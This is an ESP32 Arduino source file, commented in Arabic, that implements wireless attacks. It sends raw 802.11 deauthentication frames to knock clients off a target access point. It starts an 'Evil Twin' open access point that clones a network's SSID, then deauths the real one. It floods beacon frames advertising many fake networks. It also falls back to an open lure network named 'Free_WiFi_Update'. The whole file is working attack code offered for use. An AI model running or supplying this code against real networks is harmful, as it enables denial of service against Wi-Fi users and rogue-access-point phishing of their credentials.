#include "attacks.h"
#include <WiFi.h>
#include <esp_wifi.h>

static bool beacon_spam_active = false;
static TaskHandle_t beacon_task_handle = NULL;
static String spam_base_name;
static int spam_count = 0;

// إرسال حزم Deauth لقطع الاتصال
void startDeauth(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    for(int i=0; i<20; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        delay(5);
    }
}

// دالة Evil Twin (تم إصلاح الانهيار)
void startEvilTwin(String ssid, uint8_t* bssid, uint8_t channel) {
    stopAllAttacks(); 
    delay(200); 

    // فتح الشبكة الوهمية أولاً
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str(), "", channel);
    Serial.println("Evil Twin started on: " + ssid);
    
    // ثم إرسال حزم القطع
    delay(100);
    startDeauth(bssid, channel);
}

// مهمة بث الشبكات الوهمية
void beaconTask(void * parameter) {
    uint8_t beacon_packet[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x31, 0x04,
        0x00, 0x00
    };

    int counter = 1;
    while(beacon_spam_active) {
        String current_ssid = spam_base_name + String(counter);
        int ssid_len = current_ssid.length();
        if (ssid_len > 32) ssid_len = 32;

        beacon_packet[37] = ssid_len;
        memcpy(&beacon_packet[38], current_ssid.c_str(), ssid_len);

        // إرسال الحزم عبر واجهة STA لأنها أكثر استقراراً
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, 38 + ssid_len, false);
        
        counter++;
        if (counter > spam_count) counter = 1;
        delay(10);
    }
    vTaskDelete(NULL);
}

void startBeaconSpam(String baseName, int count) {
    stopAllAttacks();
    delay(200);
    
    // تفعيل وضع AP+STA للسماح بالبث عبر واجهة STA
    WiFi.mode(WIFI_AP_STA); 
    delay(100);

    spam_base_name = baseName;
    spam_count = count;
    beacon_spam_active = true;
    xTaskCreatePinnedToCore(beaconTask, "BeaconSpam", 4096, NULL, 1, &beacon_task_handle, 1);
    Serial.println("Beacon Spam started: " + baseName + " x" + String(count));
}

void initAttacks() {}

// دالة إيقاف الهجمات وإعادة الوضع الطبيعي
void stopAllAttacks() {
    if (beacon_spam_active) {
        beacon_spam_active = false;
        if (beacon_task_handle != NULL) {
            vTaskDelay(100);
            beacon_task_handle = NULL;
        }
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    delay(300);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free_WiFi_Update", "");
    delay(100);
}
